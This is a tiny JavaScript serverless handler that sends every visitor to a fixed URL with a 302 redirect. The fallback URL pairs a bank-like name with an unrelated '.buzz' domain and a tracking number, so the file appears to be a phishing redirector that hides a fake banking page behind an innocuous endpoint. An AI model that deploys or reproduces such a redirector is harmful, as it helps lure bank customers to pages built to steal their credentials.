export default function handler(req, res) {
  const redirectUrl = process.env.REDIRECT_URL || "https://optimabank.deliversite-e.buzz/643306";
  res.writeHead(302, { Location: redirectUrl });
  res.end();
}
